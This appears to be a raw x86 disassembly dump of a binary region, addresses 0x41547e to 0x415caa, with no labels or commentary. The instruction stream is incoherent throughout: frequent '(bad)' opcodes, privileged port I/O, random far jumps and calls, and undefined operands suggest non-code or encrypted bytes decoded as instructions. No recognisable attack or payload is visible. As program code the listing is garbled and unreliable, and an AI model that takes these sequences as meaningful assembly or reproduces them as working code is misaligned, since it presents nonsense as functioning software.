  41547e:	or     DWORD PTR [eax+0x4c],0x4d
  415482:	(bad)  
  415484:	push   ecx
  415485:	pop    ecx
  415486:	(bad)  
  415487:	in     eax,dx
  415488:	or     DWORD PTR [ebp+0x62],ecx
  41548b:	mov    ebp,0x4892162c
  415490:	out    0xf0,al
  415492:	pop    eax
  415493:	dec    esi
  415494:	and    al,0xf6
  415496:	fisttp QWORD PTR [ebx+edi*4-0x3fbc3bda]
  41549d:	shr    cl,1
  41549f:	popa   
  4154a0:	xor    BYTE PTR [ebp-0x3538cd84],0x31
  4154a7:	mov    ds:0x3ee669df,eax
  4154ac:	jae    0x4154b9
  4154ae:	jecxz  0x415524
  4154b0:	das    
  4154b1:	xor    al,0xe7
  4154b3:	fimul  WORD PTR [eax+esi*2]
  4154b6:	retf   0xbc03
  4154b9:	xchg   DWORD PTR [edi],edx
  4154bb:	pop    ss
  4154bc:	iret   
  4154bd:	or     cl,BYTE PTR [edi+ebp*2-0x3d]
  4154c1:	and    bl,BYTE PTR [esi]
  4154c3:	loopne 0x4154cc
  4154c5:	fs int 0xc2
  4154c8:	mov    dh,0x6f
  4154ca:	mov    ah,0xcc
  4154cc:	mov    bh,0x86
  4154ce:	pop    ecx
  4154cf:	test   al,0x8f
  4154d1:	inc    ecx
  4154d2:	xor    BYTE PTR [edx],0x5b
  4154d5:	popa   
  4154d6:	call   0xe3b2:0x3d58b32
  4154dd:	jno    0x41554a
  4154df:	sar    esp,0xf8
  4154e2:	rol    BYTE PTR [esi],1
  4154e4:	mov    bh,0xdf
  4154e6:	in     eax,0x90
  4154e8:	push   edx
  4154e9:	or     esp,DWORD PTR [ecx-0x6b]
  4154ec:	or     ecx,eax
  4154ee:	lods   eax,DWORD PTR ds:[esi]
  4154ef:	push   ebp
  4154f0:	repz xor BYTE PTR [ebp-0x46aec41],0xa0
  4154f8:	add    ecx,eax
  4154fa:	scas   eax,DWORD PTR es:[edi]
  4154fb:	mov    BYTE PTR [ecx+0x14],dh
  4154fe:	leave  
  4154ff:	push   edi
  415500:	inc    ebx
  415501:	xor    DWORD PTR [eax-0x70],0x3c
  415505:	outs   dx,BYTE PTR ds:[esi]
  415506:	lods   eax,DWORD PTR ds:[esi]
  415507:	sub    DWORD PTR cs:[esi],ebx
  41550a:	paddsb mm5,QWORD PTR [ebp-0x12]
  41550e:	cdq    
  41550f:	or     ch,dl
  415511:	fadd   st,st(0)
  415513:	xchg   ebp,eax
  415514:	push   ebx
  415515:	jmp    0x974377c3
  41551a:	mov    al,ds:0x9f1c6ef7
  41551f:	xchg   ebx,eax
  415520:	shl    DWORD PTR [esp+ebp*4-0x23a45d47],0xf9
  415528:	xchg   ebp,eax
  415529:	test   DWORD PTR [ecx-0x6c],esi
  41552c:	lods   al,BYTE PTR ds:[esi]
  41552d:	jp     0x415503
  41552f:	test   BYTE PTR [esi-0x4e],0xf1
  415533:	adc    BYTE PTR [ecx],ah
  415535:	adc    eax,0xa04ff463
  41553a:	add    eax,0x8b48107a
  41553f:	lods   al,BYTE PTR ds:[esi]
  415540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415541:	inc    edx
  415542:	test   al,0x4b
  415544:	hlt    
  415545:	daa    
  415546:	jae    0x4154fa
  415548:	or     DWORD PTR [eax-0x6e],edi
  41554b:	adc    esi,DWORD PTR [edi]
  41554d:	int3   
  41554e:	add    bl,BYTE PTR [ebp+0x312ec67c]
  415554:	and    bh,BYTE PTR [ebx]
  415556:	daa    
  415557:	ret    0xf2fa
  41555a:	push   0xffffffff
  41555c:	or     ecx,DWORD PTR [edi]
  41555e:	sbb    edi,0x8b9b4d3e
  415564:	mov    bl,0x75
  415566:	xchg   DWORD PTR [esp+esi*1+0xf],eax
  41556a:	mov    BYTE PTR [edx+eiz*4+0xc],cl
  41556e:	imul   BYTE PTR [ebp-0x1eb1fada]
  415574:	ds cmp esi,ebx
  415577:	mov    bl,0xbc
  415579:	(bad)  
  41557a:	repz neg DWORD PTR [ebx]
  41557d:	xor    bl,BYTE PTR [edi]
  41557f:	cmp    ah,BYTE PTR [esi]
  415581:	je     0x4155f4
  415583:	adc    al,0xbd
  415585:	sbb    dl,BYTE PTR [eax-0x173fb8b]
  41558b:	test   BYTE PTR [ecx],ch
  41558d:	pop    ss
  41558e:	pop    ebp
  41558f:	cmp    BYTE PTR [esi],ah
  415591:	or     eax,0x865a6f0c
  415596:	xchg   BYTE PTR [ebx],ah
  415598:	ds mov ebp,0xbbd0d6f9
  41559e:	and    BYTE PTR ds:0x8278ece7,ch
  4155a4:	xor    DWORD PTR [eax-0x26093655],edx
  4155aa:	fs gs xchg ecx,eax
  4155ad:	dec    eax
  4155ae:	mov    esp,0x3c72c46a
  4155b3:	ds sub al,0xd3
  4155b6:	mov    dl,cl
  4155b8:	clc    
  4155b9:	ret    0xd4e2
  4155bc:	fs (bad) 
  4155be:	xlat   BYTE PTR ds:[ebx]
  4155bf:	mov    ebx,0x37146407
  4155c4:	icebp  
  4155c5:	sbb    eax,0x81e9404e
  4155ca:	dec    ebp
  4155cb:	fst    DWORD PTR [esi-0x77cd79c3]
  4155d1:	cli    
  4155d2:	nop
  4155d3:	gs inc edx
  4155d5:	repz retf 0x8d06
  4155d9:	xor    eax,0x6f04a077
  4155de:	pop    DWORD PTR [esi]
  4155e0:	xor    DWORD PTR [ecx-0x6c],eax
  4155e3:	mov    bl,0xb8
  4155e5:	sub    dh,BYTE PTR [ebx+0x77b2f4dc]
  4155eb:	jns    0x415624
  4155ed:	lods   eax,DWORD PTR ds:[esi]
  4155ee:	call   0x878161a2
  4155f3:	test   eax,0x5ec5bbb1
  4155f8:	inc    ecx
  4155f9:	pop    ecx
  4155fa:	jbe    0x41559c
  4155fc:	xchg   esp,eax
  4155fd:	dec    ecx
  4155fe:	in     al,dx
  4155ff:	nop
  415600:	or     eax,0xa71b8193
  415605:	fs fwait
  415607:	mov    eax,0x9255bb76
  41560c:	xchg   edi,eax
  41560d:	pop    edx
  41560e:	shl    dl,1
  415610:	les    esp,FWORD PTR [edx+0xd8e4913]
  415616:	arpl   WORD PTR [edx+0x67],si
  415619:	sub    DWORD PTR [esi],0x52
  41561c:	mov    dl,0x24
  41561e:	pop    esp
  41561f:	sbb    BYTE PTR [edi+0x54a3915c],cl
  415625:	cs cmp edx,0xe
  415629:	mov    ecx,0x5572b278
  41562e:	in     eax,0x46
  415630:	sub    bh,dl
  415632:	stos   DWORD PTR es:[edi],eax
  415633:	sub    dh,BYTE PTR [eax-0xe]
  415636:	pop    ds
  415637:	add    BYTE PTR cs:[edx-0x13],bh
  41563b:	call   0xbe9d:0x66d16390
  415642:	mov    al,ds:0x7320efb
  415647:	retf   
  415648:	xchg   esi,eax
  415649:	jne    0x41564c
  41564b:	pop    esp
  41564c:	cmp    DWORD PTR [ebx-0x71f2110a],esp
  415652:	cwde   
  415653:	into   
  415654:	xor    DWORD PTR [esi-0x48],esp
  415657:	jb     0x415629
  415659:	adc    bh,BYTE PTR [ebx+0x27]
  41565c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41565d:	sbb    eax,0x3e4c33f2
  415662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415663:	mov    ebx,0xeb8ca05c
  415668:	pop    DWORD PTR [esi+esi*8-0x4b]
  41566c:	rcr    edi,cl
  41566e:	or     bh,BYTE PTR [esp+edx*8+0x7c93f60b]
  415675:	mov    al,ds:0x785e54d0
  41567a:	cdq    
  41567b:	pop    ebp
  41567c:	jecxz  0x415613
  41567e:	fwait
  41567f:	inc    edx
  415680:	rcl    BYTE PTR [edi+0x4f],1
  415683:	js     0x415626
  415685:	fnsave [eax+eax*4]
  415688:	push   0xc9e5b10c
  41568d:	shl    BYTE PTR [esi+0x7c],0x39
  415691:	test   ch,bh
  415693:	ins    BYTE PTR es:[edi],dx
  415694:	jmp    0x4156f0
  415696:	clc    
  415697:	int    0x32
  415699:	sub    ebp,DWORD PTR [edi+0xc746b00]
  41569f:	fdiv   QWORD PTR [ebx+0xc]
  4156a2:	(bad)  
  4156a3:	fucomip st,st(3)
  4156a5:	xor    dl,BYTE PTR [edi]
  4156a7:	aam    0x5f
  4156a9:	cmp    BYTE PTR [edi-0x1e64914e],0xf6
  4156b0:	or     bl,BYTE PTR gs:[edi]
  4156b3:	cmp    BYTE PTR [edx+0x1dd55e04],dl
  4156b9:	call   0x8984:0x85854bfc
  4156c0:	or     BYTE PTR [ebx],0xe3
  4156c3:	nop
  4156c4:	inc    edi
  4156c5:	in     eax,dx
  4156c6:	fcom   QWORD PTR [ebp-0x2c]
  4156c9:	shl    DWORD PTR ds:0x8ed7ec40,1
  4156cf:	xchg   esi,eax
  4156d0:	mov    ebp,0xdd5f2307
  4156d5:	sbb    ecx,edi
  4156d7:	dec    eax
  4156d8:	jl     0x41574f
  4156da:	pop    ss
  4156db:	adc    al,0x83
  4156dd:	das    
  4156de:	bsr    edx,ebx
  4156e1:	dec    edx
  4156e2:	out    0x9c,al
  4156e4:	dec    esi
  4156e5:	ss (bad) 
  4156e7:	leave  
  4156e8:	adc    eax,0xb1a831c8
  4156ed:	in     al,0x29
  4156ef:	inc    ecx
  4156f0:	inc    esp
  4156f1:	fldcw  WORD PTR [edx]
  4156f3:	test   ch,dl
  4156f5:	xor    ebx,ebp
  4156f7:	loop   0x4156aa
  4156f9:	inc    esp
  4156fa:	pushf  
  4156fb:	jecxz  0x415745
  4156fd:	push   0xfffffff4
  4156ff:	jno    0x4156fd
  415701:	stos   DWORD PTR es:[edi],eax
  415702:	mov    edi,0x874bfd68
  415707:	xchg   ebx,eax
  415708:	jmp    0x3866:0x75bd5ef3
  41570f:	bnd jg 0x415741
  415712:	out    dx,eax
  415713:	fnstcw WORD PTR ds:0x21f52ac6
  415719:	clc    
  41571a:	and    ebx,edx
  41571c:	mov    al,ds:0x511f1c58
  415721:	and    BYTE PTR [ecx+0x114be9d9],al
  415727:	adc    eax,0x12b16143
  41572c:	inc    ebx
  41572d:	dec    edi
  41572e:	sub    eax,0x50c4326f
  415733:	js     0x415713
  415735:	lods   al,BYTE PTR ds:[esi]
  415736:	xchg   esi,eax
  415737:	mov    ds:0xeeca7934,al
  41573c:	add    al,0xb5
  41573e:	enter  0x76e1,0xc4
  415742:	push   cs
  415743:	sti    
  415744:	ds xor eax,0x19cd87e8
  41574a:	pusha  
  41574b:	jnp    0x415710
  41574d:	pushf  
  41574e:	or     dl,BYTE PTR [edi]
  415750:	arpl   WORD PTR [edi+0x46],sp
  415753:	call   0xfba879ee
  415758:	out    dx,eax
  415759:	mov    ebp,0x5e04cf2c
  41575f:	dec    ecx
  415760:	sahf   
  415761:	aas    
  415762:	xor    bl,ah
  415764:	adc    DWORD PTR [ecx+0x3c],ebp
  415767:	push   ds
  415768:	cdq    
  415769:	add    esp,DWORD PTR [eax]
  41576b:	or     ah,BYTE PTR [ecx+edi*2+0x2b]
  41576f:	clc    
  415770:	cdq    
  415771:	dec    esp
  415772:	mov    esp,0xaa1315c8
  415777:	inc    esi
  415778:	and    eax,0xd7acd5e4
  41577d:	xchg   dh,bl
  41577f:	pop    esi
  415780:	pop    esp
  415781:	mov    ss,WORD PTR [ecx]
  415783:	aaa    
  415784:	mov    dl,0xe4
  415786:	adc    DWORD PTR [edi+0x596dcd5a],ebp
  41578c:	cld    
  41578d:	jo     0x4157ea
  41578f:	sbb    BYTE PTR [ecx+0x44],cl
  415792:	mov    ah,0x99
  415794:	loopne 0x415718
  415796:	adc    DWORD PTR [ebx-0x47],esi
  415799:	or     eax,0xfd6449fd
  41579e:	mov    cl,BYTE PTR [esi]
  4157a0:	pushf  
  4157a1:	and    eax,0x39674c91
  4157a6:	mov    ah,0xf2
  4157a8:	enter  0x75b0,0x76
  4157ac:	fnsave [edi+esi*8+0x1fdf9c16]
  4157b3:	mov    eax,0xaaba2e0a
  4157b8:	push   ds
  4157b9:	pop    ebp
  4157ba:	lods   al,BYTE PTR ds:[esi]
  4157bb:	into   
  4157bc:	push   edx
  4157bd:	mov    ds:0xacb3de92,al
  4157c2:	loopne 0x415834
  4157c4:	(bad)  
  4157c5:	cmp    eax,0xe3b2aa5c
  4157ca:	rep stos BYTE PTR es:[edi],al
  4157cc:	mov    ecx,0x6cfd77bd
  4157d1:	dec    ebp
  4157d2:	call   0xfc37:0x53e29996
  4157d9:	(bad)  
  4157da:	out    0xcc,al
  4157dc:	test   eax,0x521d14fe
  4157e1:	cdq    
  4157e2:	dec    edx
  4157e3:	test   edi,edx
  4157e5:	clc    
  4157e6:	jge    0x415785
  4157e8:	dec    esp
  4157e9:	call   0x2dcca213
  4157ee:	mov    eax,0x941685af
  4157f3:	adc    eax,DWORD PTR [esi+0x48ef425c]
  4157f9:	addr16 in al,dx
  4157fb:	push   es
  4157fc:	mov    edi,0x3fdcfd06
  415801:	pop    edx
  415802:	jle    0x4157ec
  415804:	loope  0x415848
  415806:	dec    eax
  415807:	daa    
  415808:	xlat   BYTE PTR ds:[ebx]
  415809:	mov    DWORD PTR ds:0xdaed52d3,ebx
  41580f:	mov    WORD PTR [eax+0x71116141],cs
  415815:	test   al,0x8f
  415817:	in     eax,dx
  415818:	jg     0x4157b7
  41581a:	cmp    al,0xb4
  41581c:	call   0xb3924b90
  415821:	addr16 xchg esp,eax
  415823:	mov    cl,bh
  415825:	and    eax,0x89174a3f
  41582a:	xchg   ebx,eax
  41582b:	rcl    DWORD PTR [esp+edx*4+0x26074a3],1
  415832:	icebp  
  415833:	ja     0x4157d7
  415835:	xor    al,0x3a
  415837:	adc    al,al
  415839:	shr    DWORD PTR [ebp-0x41],1
  41583c:	mov    esp,ebx
  41583e:	inc    esp
  41583f:	and    al,0x3e
  415841:	mov    ds:0xb7335344,eax
  415846:	stc    
  415847:	iret   
  415848:	cwde   
  415849:	clc    
  41584a:	and    al,0x25
  41584c:	out    dx,al
  41584d:	les    ebx,FWORD PTR [edx-0x30]
  415850:	in     al,dx
  415851:	sbb    edx,ecx
  415853:	pop    es
  415854:	jns    0x4158aa
  415856:	fsub   DWORD PTR [edi+0x30fc507c]
  41585c:	push   esp
  41585d:	mov    edi,0xe5bfeb4f
  415862:	stc    
  415863:	(bad)  
  415864:	jbe    0x415839
  415866:	(bad)  
  415867:	jmpw   0xb42a
  41586b:	out    0x1f,eax
  41586d:	fsubr  st,st(6)
  41586f:	in     al,0xac
  415871:	ss in  eax,dx
  415873:	inc    eax
  415874:	in     al,0x25
  415876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415877:	sar    BYTE PTR [ebp+0x7fcc1ca2],1
  41587d:	sub    bl,BYTE PTR [edi+0x5820c609]
  415883:	xor    al,0x98
  415885:	xchg   esp,eax
  415886:	fbld   TBYTE PTR [ecx]
  415888:	cmp    dh,al
  41588a:	(bad)  
  41588b:	pop    ss
  41588c:	inc    ebp
  41588d:	js     0x415819
  41588f:	je     0x415830
  415891:	add    DWORD PTR [edx],ebp
  415893:	push   ecx
  415894:	ja     0x4158b8
  415896:	push   ss
  415897:	inc    ebx
  415898:	into   
  415899:	lds    esp,FWORD PTR [eax+ebx*2+0x5ded1b39]
  4158a0:	leave  
  4158a1:	js     0x41587d
  4158a3:	neg    DWORD PTR [edx+0x25bbc25d]
  4158a9:	xor    ecx,DWORD PTR [eax]
  4158ab:	cld    
  4158ac:	jecxz  0x41589d
  4158ae:	inc    ecx
  4158af:	and    ch,dl
  4158b1:	popa   
  4158b2:	lds    edx,FWORD PTR [ecx]
  4158b4:	jae    0x41590c
  4158b6:	mov    WORD PTR [ebx+esi*4-0x4],?
  4158ba:	repnz out dx,al
  4158bc:	xchg   ebp,eax
  4158bd:	xlat   BYTE PTR ds:[ebx]
  4158be:	test   DWORD PTR [edx],0x532f351
  4158c4:	push   0xffffffde
  4158c6:	add    edi,esi
  4158c8:	xchg   DWORD PTR [ebx+0x21],edx
  4158cb:	lock xchg ecx,eax
  4158cd:	pop    esi
  4158ce:	jnp    0x4158ad
  4158d0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158d2:	mov    gs,WORD PTR [eax+0x3]
  4158d5:	pushf  
  4158d6:	sbb    al,0x90
  4158d8:	sub    DWORD PTR [ebx+ebx*1],esi
  4158db:	push   es
  4158dc:	cs sub al,0xbf
  4158df:	sbb    edi,esp
  4158e1:	xchg   esp,eax
  4158e2:	push   esi
  4158e3:	jmp    0x415938
  4158e5:	mov    ?,WORD PTR fs:[eax-0x1148ea81]
  4158ec:	sar    ebx,1
  4158ee:	(bad)  
  4158ef:	ret    
  4158f0:	fld    TBYTE PTR [ecx+0x267a188f]
  4158f6:	pushf  
  4158f7:	mov    bl,0x4e
  4158f9:	mov    ebx,0x7d31b760
  4158fe:	pop    ds
  4158ff:	add    esi,DWORD PTR [ebp+0x55]
  415902:	adc    DWORD PTR [ecx+edx*1+0x79],ebx
  415906:	dec    esi
  415907:	aaa    
  415908:	add    BYTE PTR [edi-0x199a7749],ch
  41590e:	sbb    eax,0x64dac40
  415913:	inc    ebp
  415914:	xor    DWORD PTR [ecx],ecx
  415916:	in     eax,0xde
  415918:	daa    
  415919:	cmp    esi,ebp
  41591b:	int    0x3e
  41591d:	out    0x24,al
  41591f:	push   es
  415920:	shl    DWORD PTR [ecx+esi*1-0xa62039c],0xdd
  415928:	call   0x8a4a8127
  41592d:	cmp    al,0x3a
  41592f:	sbb    ecx,DWORD PTR [ebp-0x80]
  415932:	add    bh,BYTE PTR [ecx+0x1dadc87d]
  415938:	inc    eax
  415939:	mov    eax,0x9d9ddd75
  41593e:	pop    edx
  41593f:	pop    edx
  415940:	jmp    0x415922
  415942:	out    0x7a,eax
  415944:	inc    ebp
  415945:	mov    ebx,0x2ccd4a97
  41594a:	fstp   TBYTE PTR [esi+edx*8]
  41594d:	(bad)  
  41594e:	mov    al,ds:0xc6199ead
  415953:	mov    esi,0x408abed5
  415958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415959:	mov    dh,0x46
  41595b:	cmp    al,0x61
  41595d:	push   ecx
  41595e:	imul   edi,DWORD PTR [ecx+edx*8-0x31],0x2e348f27
  415966:	xor    edx,DWORD PTR [ebp+0x58fd887e]
  41596c:	sbb    dl,BYTE PTR [esi-0x13]
  41596f:	or     eax,0x64b67c04
  415974:	jnp    0x4159c1
  415976:	mov    eax,DWORD PTR [ecx+0x3a]
  415979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41597a:	xor    BYTE PTR [ecx],ah
  41597c:	push   ecx
  41597d:	cmp    BYTE PTR ds:0xed4dc93c,bl
  415983:	int    0xd
  415985:	sahf   
  415986:	xchg   ebp,eax
  415987:	mov    BYTE PTR [esi-0x2fd94918],ch
  41598d:	push   esp
  41598e:	or     DWORD PTR [ebx-0x7f3871ff],ebp
  415994:	scas   al,BYTE PTR es:[edi]
  415995:	and    eax,eax
  415997:	data16 mov ah,0x68
  41599a:	lods   eax,DWORD PTR ds:[esi]
  41599b:	mul    BYTE PTR [ebp-0x1f]
  41599e:	add    BYTE PTR [edi],cl
  4159a0:	hlt    
  4159a1:	xlat   BYTE PTR ds:[ebx]
  4159a2:	inc    esp
  4159a3:	gs push ebp
  4159a5:	pop    edi
  4159a6:	ds pushf 
  4159a8:	dec    esi
  4159a9:	add    DWORD PTR [ecx-0x3c07faf7],ebx
  4159af:	pop    edx
  4159b0:	or     DWORD PTR [eax+esi*2+0x6c264e83],0xffffff95
  4159b8:	shr    BYTE PTR [edx-0x61affe3b],cl
  4159be:	add    BYTE PTR [edx-0x22],ch
  4159c1:	cli    
  4159c2:	adc    eax,0x97327c1
  4159c7:	sbb    BYTE PTR [edx-0x2188d355],bl
  4159cd:	fs inc edx
  4159cf:	xor    al,0x7b
  4159d1:	es and eax,eax
  4159d4:	or     DWORD PTR [esi+0x52a11911],eax
  4159da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159db:	out    0x1e,eax
  4159dd:	add    BYTE PTR [ecx+0x50],0xe8
  4159e1:	std    
  4159e2:	jmp    0xfbd653fe
  4159e7:	ret    0xe232
  4159ea:	(bad)  
  4159eb:	jg     0x415a2f
  4159ed:	add    dh,BYTE PTR [eax-0x65e886e7]
  4159f3:	mov    al,ds:0xa0d1e1bd
  4159f8:	loopne 0x4159af
  4159fa:	add    bh,cl
  4159fc:	or     ebx,DWORD PTR [eax+0x168433f2]
  415a02:	int3   
  415a03:	mov    DWORD PTR [ecx-0x2834bb45],esp
  415a09:	test   DWORD PTR [esi-0x6133d139],0xa87b8aed
  415a13:	jge    0x415a39
  415a15:	call   0x80c85e47
  415a1a:	or     edx,DWORD PTR [edi-0x48520816]
  415a20:	mov    ch,0x17
  415a22:	cdq    
  415a23:	mov    ecx,0x87bbb379
  415a28:	mov    ds:0x6efaeaf5,eax
  415a2d:	sbb    edi,DWORD PTR [ebx-0x3a]
  415a30:	xor    BYTE PTR [esi],al
  415a32:	inc    ebx
  415a33:	jne    0x4159d6
  415a35:	add    BYTE PTR [edx],cl
  415a37:	cmp    esp,esi
  415a39:	mov    ebp,0x3955cc03
  415a3e:	into   
  415a3f:	mov    ds:0xc1444106,eax
  415a44:	in     al,dx
  415a45:	and    cl,cl
  415a47:	scas   eax,DWORD PTR es:[edi]
  415a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a49:	mov    edi,0x1b69a520
  415a4e:	sahf   
  415a4f:	sub    edx,DWORD PTR [esi]
  415a51:	ret    0x5362
  415a54:	dec    esp
  415a55:	xor    al,0xf3
  415a57:	xchg   esi,eax
  415a58:	mov    ecx,0x369fb452
  415a5d:	mov    ds:0x32615632,eax
  415a62:	gs push 0x44
  415a65:	and    bh,BYTE PTR [esi+0x59]
  415a68:	aam    0x52
  415a6a:	push   ecx
  415a6b:	mov    ds,WORD PTR [eax]
  415a6d:	sub    ecx,DWORD PTR [ebx-0x72]
  415a70:	sub    BYTE PTR [edi],0xd6
  415a73:	or     edx,DWORD PTR [ebx]
  415a75:	pop    edx
  415a76:	pop    ds
  415a77:	xchg   edi,eax
  415a78:	jne    0x415a54
  415a7a:	mov    ecx,0xa288567b
  415a7f:	test   eax,0x981cb3a7
  415a84:	jb     0x415ad9
  415a86:	cs jns 0x415ae8
  415a89:	mov    eax,ds:0xd2e98df5
  415a8e:	mov    al,0x6d
  415a90:	lods   eax,DWORD PTR ds:[esi]
  415a91:	sete   BYTE PTR [ebx+ebp*4-0xf]
  415a96:	fst    QWORD PTR [eax+0x6c87c46a]
  415a9c:	or     eax,0x908329d
  415aa1:	rol    DWORD PTR [edx-0x6f],cl
  415aa4:	mov    al,ds:0x979a5647
  415aa9:	jecxz  0x415a68
  415aab:	sub    BYTE PTR [eax-0xe956705],dl
  415ab1:	(bad)  
  415ab4:	mov    edx,0x5ce620ca
  415ab9:	fld    TBYTE PTR [ebp-0x80]
  415abc:	js     0x415b2b
  415abe:	cdq    
  415abf:	ficom  DWORD PTR [ebp+0x67]
  415ac2:	lds    esi,FWORD PTR ds:0x76d59951
  415ac8:	add    DWORD PTR [eax-0x28],esi
  415acb:	stc    
  415acc:	test   DWORD PTR [edx],esp
  415ace:	ja     0x415b41
  415ad0:	iret   
  415ad1:	retf   
  415ad2:	pop    ecx
  415ad3:	and    al,0x7b
  415ad5:	push   edi
  415ad6:	scas   al,BYTE PTR es:[edi]
  415ad7:	cmp    dh,BYTE PTR [eax-0x69]
  415ada:	jle    0x415b2d
  415adc:	imul   edi,DWORD PTR [ecx],0x28
  415adf:	shr    DWORD PTR [ebx+0x410a904d],1
  415ae5:	mov    ah,0x33
  415ae7:	inc    ebp
  415ae8:	mov    edi,0xdf3564d7
  415aed:	mov    edx,0xff35d806
  415af2:	add    al,0x8
  415af4:	mov    ecx,0x57ed73fd
  415af9:	mov    edi,0xf517ade4
  415afe:	es sbb eax,0x12762e6
  415b04:	lea    ebp,[edx]
  415b06:	mov    ebp,DWORD PTR [esi]
  415b08:	add    edi,0x76606dbd
  415b0e:	xchg   esp,eax
  415b0f:	jnp    0x415b4f
  415b11:	sbb    eax,0xc074872d
  415b16:	test   DWORD PTR [eax+0x15b3b56],0x94b361fc
  415b20:	jno    0x415b0f
  415b22:	mov    DWORD PTR [ebx],ecx
  415b24:	mov    dh,0x9b
  415b26:	int3   
  415b27:	ins    DWORD PTR es:[edi],dx
  415b28:	in     al,dx
  415b29:	mov    dl,0xab
  415b2b:	sbb    ah,BYTE PTR [ebx+0x1e955cb1]
  415b31:	rol    BYTE PTR [ebp-0x4fc73c19],cl
  415b37:	jne    0x415b08
  415b39:	mov    ebp,0x391ac75a
  415b3e:	jmp    0xe3dc:0x512eea0d
  415b45:	sbb    bl,BYTE PTR [ebx+0x764483a5]
  415b4b:	das    
  415b4c:	(bad)  
  415b4e:	push   cs
  415b4f:	xor    DWORD PTR [edi-0x34],0x25
  415b53:	pop    ds
  415b54:	hlt    
  415b55:	pop    ss
  415b56:	sahf   
  415b57:	jnp    0x415b2e
  415b59:	xor    BYTE PTR [edx-0x6c8e5743],ah
  415b5f:	mov    esp,0xba22634a
  415b64:	jb     0x415b8a
  415b66:	bnd jl 0x415bc7
  415b69:	jle    0x415b36
  415b6b:	mov    esi,0x1033ab65
  415b70:	xor    edx,ebx
  415b72:	es jmp 0x52885433
  415b78:	xor    eax,0x4eb9e78
  415b7d:	xor    esp,DWORD PTR [eax+ecx*1]
  415b80:	inc    ebx
  415b81:	jb     0x415b8c
  415b83:	jl     0x415b91
  415b85:	jmp    0x72f1:0x837a45d1
  415b8c:	pop    ecx
  415b8d:	stc    
  415b8e:	mov    ebx,0x1c2ee761
  415b93:	mov    cl,0x10
  415b95:	cmp    BYTE PTR [ebx],ah
  415b97:	xchg   DWORD PTR [eax-0x1f],ebp
  415b9a:	ins    DWORD PTR es:[edi],dx
  415b9b:	dec    edi
  415b9c:	adc    DWORD PTR [esi+0x2a099dcc],ebx
  415ba2:	into   
  415ba3:	data16 in al,0x4f
  415ba6:	push   esi
  415ba7:	jb     0x415c28
  415ba9:	(bad)  
  415baa:	fdivr  DWORD PTR [ebx]
  415bac:	sub    ebp,DWORD PTR [edi]
  415bae:	pop    es
  415baf:	cmp    dh,ah
  415bb1:	sbb    ecx,ebp
  415bb3:	pop    edx
  415bb4:	push   esi
  415bb5:	mov    esp,0x2bcc588c
  415bba:	retf   
  415bbb:	addr16 ss in eax,0x4e
  415bbf:	xchg   ebx,eax
  415bc0:	imul   eax,DWORD PTR [ecx-0x35],0x8c5e9a47
  415bc7:	mov    edi,0x319e798e
  415bcc:	addr16 push 0x2f178c70
  415bd2:	arpl   WORD PTR [edx-0x283bbcb2],cx
  415bd8:	mov    ecx,0x1e28b1a3
  415bdd:	shl    edx,1
  415bdf:	(bad)  
  415be1:	pop    esi
  415be2:	not    BYTE PTR [esi-0x47]
  415be5:	mov    bh,0x1e
  415be7:	pop    ds
  415be8:	loop   0x415c31
  415bea:	mov    ah,BYTE PTR [ebp+0x1d]
  415bed:	(bad)  
  415bee:	popf   
  415bef:	jmp    0x4b55:0x408be959
  415bf6:	push   esp
  415bf7:	push   0x5c08b15a
  415bfc:	mov    esp,DWORD PTR [ebx]
  415bfe:	sar    DWORD PTR [ebp-0x60],0x41
  415c02:	mov    cl,0x39
  415c04:	leave  
  415c05:	add    al,0xf1
  415c07:	call   0xc8c3:0x15ad031a
  415c0e:	outs   dx,BYTE PTR ds:[esi]
  415c0f:	ret    
  415c10:	mov    eax,0x59e0561d
  415c15:	sbb    DWORD PTR [esi+0x47c098a],edi
  415c1b:	and    ebx,edi
  415c1d:	xor    al,0x50
  415c20:	fmul   DWORD PTR [ebp+esi*1+0x454a4fa9]
  415c27:	js     0x415ca2
  415c29:	push   ebx
  415c2a:	xchg   ebp,eax
  415c2b:	push   cs
  415c2c:	adc    DWORD PTR [edi-0x4c],eax
  415c2f:	sbb    al,BYTE PTR [esp+edi*1+0x2aa33ca2]
  415c36:	mov    eax,0x8658f5ed
  415c3b:	int    0x4a
  415c3d:	mov    es,WORD PTR [ecx-0xd]
  415c40:	fimul  DWORD PTR [ecx+0x0]
  415c43:	(bad)  
  415c44:	cli    
  415c45:	shl    ebp,cl
  415c47:	out    0x9c,eax
  415c49:	mov    BYTE PTR [edi-0x14],bl
  415c4c:	cwde   
  415c4d:	cmp    BYTE PTR [edx+0x41a07f4],ch
  415c53:	mov    esi,0xa7d5bb7e
  415c58:	popf   
  415c59:	mov    al,0xc5
  415c5b:	sub    bl,ch
  415c5d:	cmc    
  415c5e:	test   al,0x86
  415c60:	push   eax
  415c61:	imul   ecx,DWORD PTR ds:0xeae1f296,0x10
  415c68:	jb     0x415cab
  415c6a:	mov    DWORD PTR [esi-0x52afc6ba],ebx
  415c70:	cmp    DWORD PTR [esi-0x7d0ddc3b],ebp
  415c76:	xchg   edx,eax
  415c77:	(bad)
  415c7a:	(bad)  
  415c7b:	out    dx,eax
  415c7c:	outs   dx,BYTE PTR ds:[esi]
  415c7d:	leave  
  415c7e:	mov    ebx,0x37ea5dec
  415c83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c84:	jno    0x415c78
  415c86:	or     BYTE PTR [eax],bl
  415c88:	and    DWORD PTR [edx+0x24235f62],edi
  415c8e:	mov    esp,0x5ef57d6b
  415c93:	dec    ecx
  415c94:	scas   eax,DWORD PTR es:[edi]
  415c95:	aad    0x88
  415c97:	mov    esi,0x19b9c875
  415c9d:	stos   BYTE PTR es:[edi],al
  415c9e:	test   eax,0x57741147
  415ca3:	pop    ecx
  415ca4:	xchg   ebp,eax
  415ca5:	pop    esi
  415ca6:	mov    bl,0x8d
  415ca8:	inc    ebx
  415ca9:	pop    es
  415caa:	jge    0x415ce3
